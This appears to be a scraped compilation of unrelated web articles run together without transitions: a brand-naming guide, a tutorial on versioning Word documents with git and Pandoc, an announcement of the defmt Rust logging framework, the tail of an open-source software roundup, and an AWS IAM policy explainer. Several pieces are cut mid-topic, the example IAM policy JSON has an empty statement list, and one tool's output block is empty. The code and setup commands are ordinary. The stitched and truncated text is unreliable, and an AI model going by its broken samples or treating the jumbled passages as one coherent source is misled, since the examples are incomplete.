<p>In <a href="https://toolbox.humandeluxe.com/2020/08/07/how-to-name">this video</a>, I walked you through our naming process. We usually work in a workshop format to create a long list of potential brand names for our clients. This can be done either remote or onsite. If you’ve missed this it the last time, make sure you watch the video first:</p>

<iframe width="560" height="420" src="https://www.youtube.com/embed/T8Hlbp8mp_I?color=white&amp;theme=light"></iframe>

<p>Once we have the long list of names, how do we make the selection? How do we distinguish between good and bad brand names?</p>

<p>The process is twofold: On the one side, we need too identify good brand names, on the other side we need to exclude all the bad names. So let’s look at the first part: How do you create a good brand name?</p>

<h2 id="what-makes-a-good-brand-name">What makes a good brand name?</h2>

<p>At Human Deluxe, we follow the teachings of Alexandra Watkins, who created the SMILE &amp; SCRATCH principles: Good names make you smile, bad names leave you scratch your head. Of course, these are Acronyms, so let’s look at how to make yourself SMILE with a good name:</p>

<p>The qualities of a good name:</p>

<p><strong>Suggestive</strong>: A good name will give you a hint of a positive brand experience. It will suggest the rest of the brand for you. Great examples of this are travel company KAYAK or streaming service Pandora: Once you open the streaming box, it would not stop playing – clever, right?</p>

<p><strong>Meaningful</strong> A good name resonates with your target audience. Not only do they feel good, but they already know what to expect. Obvious examples of this are domain provider Namecheap, diet drink Slimfast or even good old Facebook.</p>

<p><strong>Imagery</strong> A great name is visually evocative. It creates a picture in your head that people will instantly associate with your brand. Even if a name is abstract, it will be able to give your audience a certain association and idea of what it could look like. Think of brands like: Caterpilar or Citibank – these are great examples.</p>

<p><strong>Legs</strong> Like a good hiker, a great name has strong legs. It lends itself to a theme for extra mileage: A name with great legs can shine through to the whole brand, directing the tonality and vocabulary. Personally, I like how twitter worked that in: A single microblogpost is a Tweet, the logo is a bird, even certain icons would be bird-themed, like the birdhouse Home button or the egg avatar.</p>

<p><strong>Emotional</strong> A good brand name moves people. does not only work in their mind, it touches their heart. This works for both B2C and B2B companies. Business brands don’t have to be boring. In fact, they can swing up to greater heights if they have an emotional impact, distinguishing themselves from their dull competition. Brands that are brave enough to be emotional do connect with humans like no other. Take Yahoo! or Greenpeace for example – it works.</p>

<p>If you want to figure out if your brand is good, your name for these criterias. At best, a good name ticks all of them. At least, your name should check one or two criterias. At any cost, avoid head scratchers names. In our next article, we will explain what these are and how you identify them.

<p>One of the major challenges of writing a journal article is to keep track of versions - both the different versions you create as the document progresses, and to merge in the changes made by your collaborators. For most academics Microsoft Word is the default writing tool, and it is both very good and very bad in this. Very good because the <em>track changes</em> feature makes it easy to see what has changed since the last version and who made the changes. Very bad because this feature is built around keeping everything in a single Word document, so that only one person can work on on a manuscript at a time. This usually means sending manuscripts around by email, and being very careful about not confusing different versions of the document, which requires <a href="http://www.phdcomics.com/comics/archive.php?comicid=1531">creativity</a>.<!--more--></p>
<p>Approaches to overcome these challenges are to a) integrate the Word documents into collaboration tools such as Sharepoint and Office 365, or document sharing services such as Dropbox and Google Docs (if you use it just for that), or b) use a different authoring tool altogether. If neither of these approaches works for you, you have a third option: use the version control system <strong>git</strong>.</p>
<p><a href="http://www.mulvany.net/presentations/WikimaniaOpenScholarshipTalk.slides.html#/3">Git</a> is software that helps with <a href="https://blog.martinfenner.org/2014/08/25/using-microsoft-word-with-git/(http://git-scm.com/book/en/Getting-Started-About-Version-Control)">tracking changes to files</a> so that you can recall specific versions later. Git is typically used to track changes of software source code (and was originally developed by Linus Torvalds for Linux kernel development in 2005), but in fact git can be used for any file where we need to keep track of versions over time. Git is open source software that runs locally on your computer, so please go ahead and start tracking changes to your manuscripts (or other complex documents) with git. Any time you want to store a version, do a <code>git commit</code> with a little description and an optional tag.</p>
<p>This approach is not ideal, as git was written with source code in text format in mind and for example doesn’t understand what has changed between two revisions of a Word document. Some people will tell you to never store binary files in a version control system, but don’t listen to them. Instead give git a tool to convert Word documents into plain text, and git will then happily tell you what has changed between revisions. Several tools can do this, but since earlier this month Pandoc can read Word documents in <code>docx</code> format. Do the following to have Pandoc convert Word documents into markdown, and to compare the revisions by word and not by line (which makes more sense):</p>
<pre><code># .gitattributes file in root folder of your git project
*.docx diff=pandoc</code></pre>
<pre><code># .gitconfig file in your home folder
[diff "pandoc"]
  textconv=pandoc --to=markdown
  prompt = false
[alias]
  wdiff = diff --word-diff=color --unified=1</code></pre>
<p>You can then use <code>git wdiff important_file.docx</code> to see the changes (with deletions in red and insertions in green), or <code>git log -p --word-diff=color important_file.docx</code> to see all changes over time.</p>
<p>While you can now track revisions of a Word document and see the changes, you also want to be able to merge different versions of a Word document together so that you and your collaborators can work on the manuscript in parallel. Git can’t merge binary files together, so you need to first convert the Word document into a format that git understands. Just as in the previous example we can use Pandoc for that, with markdown as the textual format. This would also work with HTML or LaTeX, but the simplicity of markdown makes it better suited for version control which doesn’t know about the markup of these formats.</p>
<p>One of the reasons that git became so popular with software developers is that it is a <strong>distributed version control system</strong> instead of a centralized system such as Subversion. This means that you can track all revisions locally on your computer, but can still synchronize your revisions with another user. <strong>Github</strong> is a popular service that facilitates this synchronization and adds some nice features on top. One way to collaborate with your co-authors is therefore to set up a Github repository (public or private) for your manuscript, and store the master version of the manuscript in markdown format. Instead of working on the master version directly, you would use Pandoc to convert back and forth between this master version in markdown format and your Word document, and would continue to use Word as authoring tool. <a href="https://blog.martinfenner.org/2014/08/18/introducing-rakali/">Rakali</a> is a Pandoc tool that I released last week that can help automate this document conversion. Github has a a number of features to facilitate collaboration that can be used here, e.g.&nbsp;Github issues for discussion and task management.</p>
<p>There are still a few rough edges in the workflow described above (e.g.&nbsp;only partial support of Word track changes), but it is an interesting approach to collaborate using Microsoft Word and git. And this workflow can of course be enhanced to also include authors that write in LaTeX or one of the other formats that Pandoc supports. One nice side effect of using markdown is that Github will automatically render a webpage for the document (which it will not do for HTML without extra effort).</p>

August 28, 2020 | https://ferrous-systems.com/blog/defmt/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/defmt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today we are thrilled to announce the public release of <a href="https://github.com/knurling-rs/defmt"><code>defmt</code></a> ("de format").
<code>defmt</code> stands for "deferred formatting" and it's a highly efficient logging framework.
As we covered in <a href="https://ferrous-systems.com/blog/21st-century-embedded-tooling/">our blog post about embedded tooling for the 21st century</a> we hope <code>defmt</code> will serve as the base for features like data visualization and interactive logging front-ends.
In this post we'll cover how to use <code>defmt</code> with <code>probe-rs</code> supported devices and what you can do with <code>defmt</code> today.</p>



<p>We have created a <a href="https://github.com/knurling-rs/app-template">Cargo project template</a> to make the setup easier.
Here are the setup steps.</p>

<ol>
  <li>Install the <strong>git</strong> version of <code>probe-run</code>, <a href="https://ferrous-systems.com/blog/probe-run/">a custom Cargo runner that lets you run embedded apps if they were native apps</a>. Be sure to enable the <code>defmt</code> Cargo feature!</li>
</ol>

<div><pre><code><span>$</span> cargo install <span>\</span>
    <span>--git</span> https://github.com/knurling-rs/probe-run <span>\</span>
    <span>--branch</span> main <span>\</span>
    <span>--features</span> defmt
</code></pre></div>
<ol>
  <li>Either initialize the project template with <a href="https://crates.io/crates/cargo-generate"><code>cargo-generate</code></a> or <a href="https://github.com/knurling-rs/app-template/archive/master.zip">fetch a copy</a> and initialize the <code>Cargo.toml</code> manually.</li>
</ol>

<div><pre><code><span>$</span> cargo generate <span>\</span>
    <span>--git</span> https://github.com/knurling-rs/app-template <span>\</span>
    <span>--branch</span> main <span>\</span>
    <span>--name</span> my-app
</code></pre></div>
<p>If you are not using <code>cargo-generate</code> you'll need to manually enter the <code>author</code> and <code>name</code> fields in <code>Cargo.toml</code>.</p>

<div><pre><code> # Cargo.toml
 [package]
<span>-# authors = ["{{authors}}"]
-# name = "{{project-name}}"
</span><span>+name = "my-app"
</span></code></pre></div>
<p>After that there are a few TODOs in the template.
You can <a href="https://github.com/BurntSushi/ripgrep"><code>ripgrep</code></a> for the word TODO (<code>rg TODO .cargo .</code>) to find them but we'll walk you through all of them in this blog post.</p>

<ol>
  <li>Pick a chip from <code>probe-run --list-chips</code> and enter it into <code>.cargo/config.toml</code>.</li>
</ol>

<p>If, for example, you have a nRF52840 Development Kit from one of <a href="https://github.com/ferrous-systems/embedded-trainings-2020">our workshops</a> then replace <code>{{chip}}</code> with <code>nRF52840_xxAA</code>.</p>

<div><pre><code> # .cargo/config.toml
 [target.'cfg(all(target_arch = "arm", target_os = "none"))']
<span>-runner = "probe-run --chip {{chip}} --defmt"
</span><span>+runner = "probe-run --chip nRF52840_xxAA --defmt"
</span></code></pre></div>
<ol>
  <li>Adjust the compilation target in <code>.cargo/config.toml</code>.</li>
</ol>

<p>For the nRF52840 chip you'll want to use the <code>thumbv7em-none-eabihf</code> target.</p>

<div><pre><code> # .cargo/config.toml
 [build]
<span>-target = "thumbv6m-none-eabi"    # Cortex-M0 and Cortex-M0+
-# target = "thumbv7m-none-eabi"    # Cortex-M3
-# target = "thumbv7em-none-eabi"   # Cortex-M4 and Cortex-M7 (no FPU)
-# target = "thumbv7em-none-eabihf" # Cortex-M4F and Cortex-M7F (with FPU)
</span><span>+target = "thumbv7em-none-eabihf" # Cortex-M4F (with FPU)
</span></code></pre></div>
<ol>
  <li>Add a HAL as a dependency.</li>
</ol>

<p>For the nRF52840 you'll want to use the <a href="https://crates.io/crates/nrf52840-hal"><code>nrf52840-hal</code></a>.</p>

<div><pre><code> # Cargo.toml
 [dependencies]
<span>-# some-hal = "1.2.3"
</span><span>+nrf52840-hal = "0.11.0"
</span></code></pre></div>
<ol>
  <li>Now that you have selected a HAL fix the HAL import in <code>src/lib.rs</code></li>
</ol>

<div><pre><code> // my-app/src/lib.rs
<span>-// use some_hal as _; // memory layout
</span><span>+use nrf52840_hal as _; // memory layout
</span></code></pre></div>


<p>You are now all set to <code>cargo-run</code> your first <code>defmt</code>-powered application!
There are some examples in the <code>src/bin</code> directory.</p>

<div><pre><code><span>// my-app/src/bin/hello.rs</span>

<span>#</span><span>!</span><span>[</span><span>no_main</span><span>]</span>
<span>#</span><span>!</span><span>[</span><span>no_std</span><span>]</span>

<span>use</span> <span>my_app</span> <span>as</span> <span>_</span><span>;</span> <span>// global logger + panicking-behavior + memory layout</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"Hello, world!"</span><span>);</span>

    <span>my_app</span><span>::</span><span>exit</span><span>()</span>
<span>}</span>
</code></pre></div>
<p><code>cargo run</code>-ning this program produces the classic "Hello, world!" output.</p>

<div><pre><code><span>$</span> <span># `rb` is an alias for `run --bin`</span>
<span>$</span> cargo rb hello
<span>    Finished dev [optimized + debuginfo] target(s) in 0.03s
flashing program ..
DONE
resetting device
0.000000 INFO Hello, world!
(..)

</span><span>$</span> <span>echo</span> <span>$?</span>
<span>0
</span></code></pre></div>
<p>Or if you are using VS code + Rust-Analyzer, instead, you can open the <code>src/bin/hello.rs</code> file and <a href="https://ferrous-systems.com/blog/run-rust-on-your-embedded-device-from-vscode/">click the "Run" button as we demonstrated in a previous blog post</a>.</p>

<p>Now let's take a closer look at the features of the framework.
This post will be a quick overview.
For more details check out <a href="https://defmt.ferrous-systems.com/">the <code>defmt</code> book</a>.</p>



<p>We have wired the <code>panic_handler</code> to <code>defmt</code> to make panicking much cheaper.
Consider this example, which is part of the project template:</p>

<div><pre><code><span>// my-app/src/bin/panic.rs</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"main"</span><span>);</span>

    <span>panic!</span><span>()</span>
<span>}</span>
</code></pre></div>
<p>It produces this output:</p>

<div><pre><code><span>$</span> cargo rb panic
<span>0.000000 INFO main
0.000001 ERROR panicked at src/bin/panic.rs:11:5
stack backtrace:
   0: 0x00000554 - __bkpt

   7: 0x00000238 - ResetTrampoline
   8: 0x00000214 - Reset
</span></code></pre></div>
<p>As you may have seen from our previous posts with <code>probe-run</code> you get a stack backtrace for free!</p>

<h2 id="binary-size">Binary size</h2>

<p>What I wanted to highlight here is the binary size.
Here's the output of <code>cargo-size</code> (part of the <a href="https://crates.io/crates/cargo-binutils"><code>cargo-binutils</code></a> project).</p>

<div><pre><code><span>$</span> cargo size <span>--bin</span> panic <span>--</span> <span>-A</span>
<span>section              size        addr

.rodata               360       0x600
</span></code></pre></div>
<p>An here's the output of <a href="https://crates.io/crates/cargo-bloat"><code>cargo-bloat</code></a></p>

<div><pre><code><span>$</span> cargo bloat <span>-n</span> 5 <span>--bin</span> panic

</span></code></pre></div>
<p>There are <strong>no</strong> <code>core::fmt</code> function calls there and that's what makes the binary so small.</p>

<h2 id="vs-rprintln">vs <code>rprintln!</code></h2>

<p>Let's compare against a program that uses <a href="https://docs.rs/rtt-target/0.2.0/rtt_target/macro.rprintln.html"><code>rtt_target::rprintln</code></a>, which is hard-wired to <code>core::fmt</code>.</p>

The <code>defmt</code>-powered <code>panic</code> uses 1.59 KB of Flash (<code>.text</code> + <code>.rodata</code>); <code>panic-rprintln</code> uses 13.85 KB.
That's almost a whopping 9x savings.

<p>Now you can panic without reservation: panic messages are no longer binary-size expensive.
Also, no more need to reach out for crates that discard panic information, like <a href="https://crates.io/crates/panic-halt"><code>panic-halt</code></a>, to keep the binary size low.</p>



<p>If you have used the <code>log</code> crate before you know that it supports 5 logging levels: trace, debug, info, warn and error – sorted from lowest severity to highest.
<code>defmt</code> supports the same five levels through 5 logging macros: <code>trace!</code>, <code>debug!</code>, <code>info!</code>, <code>warn!</code> and <code>error!</code>.
Let's see them in action:</p>

<div><pre><code><span>// my-app/src/bin/levels.rs</span>

<span>#[cortex_m_rt</span><span>::</span><span>entry]</span>
<span>fn</span> <span>main</span><span>()</span> <span>-&gt;</span> <span>!</span> <span>{</span>
    <span>defmt</span><span>::</span><span>info!</span><span>(</span><span>"info"</span><span>);</span>
    <span>defmt</span><span>::</span><span>trace!</span><span>(</span><span>"trace"</span><span>);</span>
    <span>defmt</span><span>::</span><span>warn!</span><span>(</span><span>"warn"</span><span>);</span>
    <span>defmt</span><span>::</span><span>debug!</span><span>(</span><span>"debug"</span><span>);</span>
    <span>defmt</span><span>::</span><span>error!</span><span>(</span><span>"error"</span><span>);</span>

    <span>my_app</span><span>::</span><span>exit</span><span>()</span>
<span>}</span>
</code></pre></div>
<p>This is the output:</p>

<div><pre><code><span>$</span> cargo rb levels
<span>0.000000 INFO info
0.000001 TRACE trace
0.000002 WARN warn
0.000003 DEBUG debug
0.000004 ERROR error
</span></code></pre></div>
<p>Not shown above but the logging level (e.g. INFO) gets nicely colored in the terminal output.</p>

<h2 id="filters">Filters</h2>

<p>The main reason for having logging levels is to be able to filter some of them out.
If we re-run the <code>levels</code> example but compile it using the <code>release</code> profile we get less output:</p>

<div><pre><code><span>$</span> <span># `rrb` is an alias for `run --release --bin`</span>
<span>$</span> cargo rrb levels
<span>0.000000 INFO info
0.000001 WARN warn
0.000002 ERROR error
</span></code></pre></div>
<p>This is because the project template has been configured to report all logging levels when the <code>dev</code> profile is used, but only INFO and higher severity logs when the <code>release</code> profile is used.</p>

<p><code>defmt</code> defaults to logging nothing (filtering everything out) but this behavior can be configured via Cargo features.</p>

<p>If you look at the project template's <code>Cargo.toml</code> you'll see that the <code>defmt-default</code> feature is enabled for the top crate (<code>my-app</code>):</p>

<div><pre><code><span>[features]</span>
<span>default</span> <span>=</span> <span>[</span>
  <span>"defmt-default"</span><span>,</span>
<span># "dependency-a/defmt-trace",</span>
<span>]</span>
</code></pre></div>
<p>The <code>defmt-default</code> behavior logs at TRACE level and higher severity if profile is <code>dev</code> and log INFO and up if profile is <code>release</code>.
The other features like <code>defmt-warning</code> enable logging at the specified level (WARN) and up regardless of the compilation profile (<code>dev</code> or <code>release</code>).</p>

<p>Logging filters can be configured per crate using Cargo features.
If you have used the <a href="https://docs.rs/env_logger/0.7.1/env_logger/"><code>env_logger</code></a> crate you may have used the <code>RUST_LOG</code> environment variable to enable logging in dependencies.
With <code>env_logger</code> you use <code>RUST_LOG=dep-a=debug,dep-b=info</code> to enable DEBUG logging in <code>dep-a</code> and INFO logging in <code>dep-b</code>.
With <code>defmt</code> that configuration is done in the top crate's <code>Cargo.toml</code> as shown below:</p>

<div><pre><code> # Cargo.toml
 [features]
 default = [
   "defmt-default",
<span>-# "dependency-a/defmt-trace",
</span><span>+  "dep-a/defmt-debug",
+  "dep-b/defmt-info",
</span> ]
</code></pre></div>


<p>So far we have only logged string literals in our examples but <code>defmt</code> also supports formatting arguments.
<code>core::write!</code> supports a variety of formatting parameters, each one associated to a formatting trait: <code>{:?}</code> (<code>Debug</code>), <code>{}</code> (<code>Display</code>), <code>{:x}</code> (<code>Hex</code>).
<code>defmt</code> has a single formatting trait: <code>Format</code>, which is associated to the <code>{:?}</code> formatting parameter.</p>

<p><code>{:?}</code> expects a type that implements the <code>Format</code> trait.
<code>Format</code> is implemented for primitives like integers and slices.
To implement <code>Format</code> for user-defined types (structs or enums) use the <code>#[derive(Format)]</code> attribute.</p>

<p>In addition to <code>{:?}</code>, there are formatting parameters for some primitives: e.g. <code>{:u8}</code>, <code>{:bool}</code>.
Prefer these parameters for primitives as they compress the …</p></div></div>

Because its free in every sense of the word, its especially good for companies and groups that want to self host their software due to concerns over privacy and control. Other times open source solutions are chosen by those who simply want to have the freedom to use a consistent set of tools that are not tied to a single vendor. The only problem is that there is <i>so much of it</i>. It is hard to sort through it all. So to save you the trouble, we are sharing our picks about what we consider to be the best of the best open social software out there. Enjoy!</p><p>By the way we might have jumped the gun a bit with the title but 2021 is almost here. We're pretty sure these apps will stand the test of time. We use these apps ourselves every day, we have deployed them on behalf of our clients and we are confident they will remain highly competitive options throughout 2021, and if that changes we'll update this article. Good Luck!</p><p>If these apps aren't your cup of tea, we have good news. There are hundreds of other free social apps that you can search for on github.com. Content management systems, workflow tools, collaborative document editing, microblogging software and more. Have we missed anything important? Do you have any feedback or questions?</p> <p><a href="mailto:hi@opensocial.com">Let us know!</a></p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>The IAM policy is the cornerstone of security of an AWS account. There is an oft-repeated notion of the shared responsibility model that stipulates that certain parts of security is the responsibility of the cloud provider, such as preventing malicious parties physical access to the infrastructure. On the other hand, the cloud provider gives you security controls and it is your responsibility to use them properly.</p> <p>The main security control is IAM and it is used everywhere inside AWS. With IAM you are not only able to create users for people who need access to the account but also to define what each user has access to.</p> <p>There are several types of policies, but the two most important ones are the identity-, and the resource-based policies. Whatever you do in your AWS account you’ll need to use these.</p> <h2 id="identity-based-policies">Identity-based policies</h2> <p>Identity-based policies are the easier of the two, as some variation of it is present in most systems. They <strong>define what an identity can do</strong>, such as a user has access to an S3 bucket.</p> <p>There are two types of identities in AWS: <strong>users and roles</strong>. By attaching a policy to an identity you can give it permissions to access resources. For example, you can attach this policy to allow a user to read an object in an S3 bucket:</p> <div><div><pre><code><span>{</span><span>
	</span><span>"Version"</span><span>:</span><span> </span><span>"2012-10-17"</span><span>,</span><span>
	</span><span>"Statement"</span><span>:</span><span> </span><span>[</span><span>

		</span><span>}</span><span>
	</span><span>]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div> <p>Since the policy is attached to an identity, a user in this case, there is no Principal element in the policy. On the other hand, the Resource defines the object in the bucket that the user can access.</p> <p><svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="" style="width:384px;height:265px" viewBox="0 0 384 265"><defs><filter height="300%" id="prefix__a" width="300%" x="-1" y="-1"><feGaussianBlur result="blurOut" stdDeviation="2"></feGaussianBlur><feColorMatrix in="blurOut" result="blurOut2" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 .4 0"></feColorMatrix><feOffset dx="4" dy="4" in="blurOut2" result="blurOut3"></feOffset><feBlend in="SourceGraphic" in2="blurOut3"></feBlend></filter></defs><ellipse cx="141" cy="18" fill="#FEFECE" filter="url(#prefix__a)" rx="8" ry="8" stroke="#A80036" stroke-width="2.0"></ellipse><path d="M141 26v27m-13-19h26m-13 19l-13 15m13-15l13 15" fill="none" filter="url(#prefix__a)" stroke="#A80036" stroke-width="2.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="31" x="125.5" y="87.995">user</text><path d="M241 37c0-10 34-10 34-10s34 0 34 10v25.297c0 10-34 10-34 10s-34 0-34-10V37" fill="#FEFECE" filter="url(#prefix__a)" stroke="#000000" stroke-width="1.5"></path><path d="M241 37c0 10 34 10 34 10s34 0 34-10" fill="none" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="48" x="251" y="63.995">bucket</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M51 152L51 228.891 231 228.891 231 162 221 152 51 152z" stroke="#000000" stroke-width="1.5"></path><path d="M221 152v10h10" fill="#FEFECE" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="39" x="61" y="174.995">policy</text><path d="M52 178.297L230 178.297M52 180.297L230 180.297" stroke="#000000" stroke-width="1.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="144" x="67" y="195.292">Action: s3:GetObject</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="148" x="67" y="211.589">Resource: &lt;bucket&gt;</text><path d="M141 91.08v60.88" fill="none" stroke="#A80036" stroke-width="1.0"></path><path d="M156.63 49.5h78.95" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M240.76 49.5L231.76 45.5 235.76 49.5 231.76 53.5 240.76 49.5z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="48" x="174.75" y="42.567">Allowed</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="372" y="251.995">A policy attached to the user gives access to a bucket</text></svg> </p> <p>Note that groups are not identities but a way to attach policies to multiple users.</p> <h3 id="users">Users</h3> <p>There is only one type of user that can be created, but depending on how they are used we can distinguish <em>natural</em> and <em>technical</em> users.</p> <p>Natural users are created for people.

Then you attach a policy so that it can publish a notification to the topic.</p> <p><svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="" style="width:454px;height:459px" viewBox="0 0 454 459"><defs><filter height="300%" id="prefix__a" width="300%" x="-1" y="-1"><feGaussianBlur result="blurOut" stdDeviation="2"></feGaussianBlur><feColorMatrix in="blurOut" result="blurOut2" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 .4 0"></feColorMatrix><feOffset dx="4" dy="4" in="blurOut2" result="blurOut3"></feOffset><feBlend in="SourceGraphic" in2="blurOut3"></feBlend></filter></defs><path fill="#FFF" filter="url(#prefix__a)" d="M115.5 24.5H281.5V111.5H115.5z" stroke="#000000" stroke-width="1.5"></path><path d="M275.5 25.5v8.297l-10 10h-150" fill="none" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" font-weight="bold" lengthAdjust="spacingAndGlyphs" textLength="150" x="118.5" y="38.495">Third-party system</text><path fill="#FFF" filter="url(#prefix__a)" d="M122.5 182H373.5V407H122.5z" stroke="#000000" stroke-width="1.5"></path><path d="M168.5 183v8.297l-10 10h-36" fill="none" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" font-weight="bold" lengthAdjust="spacingAndGlyphs" textLength="36" x="125.5" y="195.995">AWS</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M138.5 59.5H218.5V95.797H138.5z" stroke="#A80036" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="60" x="148.5" y="82.495">backend</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M138.5 217H218.5V253.297H138.5z" stroke="#A80036" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="60" x="148.5" y="239.995">IAM User</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M307.5 221H357.5V253.297H307.5z" stroke="#000000" stroke-width="1.5"></path><path fill="#FEFECE" d="M303.5 217H353.5V249.297H303.5z" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="34" x="311.5" y="237.995">topic</text><path fill="#FEFECE" filter="url(#prefix__a)" d="M138 314L138 390.891 305 390.891 305 324 295 314 138 314z" stroke="#000000" stroke-width="1.5"></path><path d="M295 314v10h10" fill="#FEFECE" stroke="#000000" stroke-width="1.5"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="39" x="148" y="336.995">policy</text><path d="M139 340.297L304 340.297M139 342.297L304 342.297" stroke="#000000" stroke-width="1.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="135" x="154" y="357.292">Action: SNS:Publish</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="134" x="154" y="373.589">Resource: &lt;topic&gt;</text><ellipse cx="60.5" cy="46" fill="#FEFECE" filter="url(#prefix__a)" rx="8" ry="8" stroke="#A80036" stroke-width="2.0"></ellipse><path d="M60.5 54v27m-13-19h26m-13 19l-13 15m13-15l13 15" fill="none" filter="url(#prefix__a)" stroke="#A80036" stroke-width="2.0"></path><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="40" x="40.5" y="115.995">visitor</text><path d="M80.52 77.5h52.68" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M138.28 77.5L129.28 73.5 133.28 77.5 129.28 81.5 138.28 77.5z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="21" x="99" y="70.567">call</text><path d="M178.5 95.74v115.77" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M178.5 216.69L182.5 207.69 178.5 211.69 174.5 207.69 178.5 216.69z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="78" x="179.5" y="162.067">Access keys</text><path d="M184.84 253.04c5.94 15.94 15.01 40.3 22.64 60.8" fill="none" stroke="#A80036" stroke-width="1.0"></path><path d="M218.83 235h79.48" fill="none" stroke="#A80036" stroke-width="1.0"></path><path fill="#A80036" d="M303.42 235L294.42 231 298.42 235 294.42 239 303.42 235z" stroke="#A80036" stroke-width="1.0"></path><text font-family="sans-serif" font-size="13" lengthAdjust="spacingAndGlyphs" textLength="48" x="237" y="228.067">Allowed</text><text font-family="sans-serif" font-size="14" lengthAdjust="spacingAndGlyphs" textLength="442" y="445.995">A technical user gives programmatic access to the AWS account</text></svg> </p> <h3 id="roles">Roles</h3> <p>Roles are <strong>temporary credentials that other identities (users and roles) can assume to gain access to the permissions the role has</strong>.

To give access to your account, you can use a role that can be used by identities in another account. This way you don’t need to create users and transfer secrets (passwords or access keys) to grant cross-account access. Another use-case is users logging in via SAML or Cognito. Instead of creating a user for every single person who can log in, you define a role and all users assume it. Then you can give permissions to the role and all users signed in this way will gain those permissions.</p> <p>Also, AWS services use roles to gain permissions to access your account. For example, CloudTrail can put logs into a CloudWatch Log group, but it needs permission to do so. On the Trail config, you need to specify a role:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_role-72cf0208de53148da9ebb597ccf983890b3c5c8ba59222865e849f81918718c9.png" integrity="sha256-cs8CCN5TFI2p67WXzPmDiQs8XIulkiKGXoSfgZGHGMk=" crossorigin="anonymous"></p> <p>This role allows the CloudTrail service to assume it:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_role_trust-88790c9eb727ab035fd2e4d564b15ca8bb07951376ea75da8e0918ce8d92983f.png" integrity="sha256-iHkMnrcnqwNf0uTVZLFcqLsHlRN26nXajgkYzo2SmD8=" crossorigin="anonymous"></p> <p>And the role has the policies to access CloudWatch Logs:</p> <p><img src="https://advancedweb.hu/assets/posts/iam_identity_resource_policies/cloudtrail_permissions-e536a8a0d9a50b84c797d688f891bdc7440c1a6c010d919b7e6bc9854dee03bd.png" integrity="sha256-5TaooNmlC4THl9aI+JG9x0QMGmwBDZGbfmvJhU3uA70=" crossorigin="anonymous"></p> <p>This way you have full control over what a given service can do. And this pattern appears in many places. A Lambda function uses a role in a similar way, the S3 bucket replication gains permissions to write a bucket using a role, and AWS Organizations creates a role in the member account so that you can initialize the resources inside it.</p> <h2 id="resource-based-policies">Resource-based policies</h2> <p>What if there is no identity to attach the policies to? This is the case for anonymous access, and also when an AWS service does not use a service role, such as an API Gateway. When there is no identity, identity-based policies can not be used.</p> <p>Many, but not all, AWS services <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_aws-services-that-work-with-iam.html">support resource-based policies</a>.

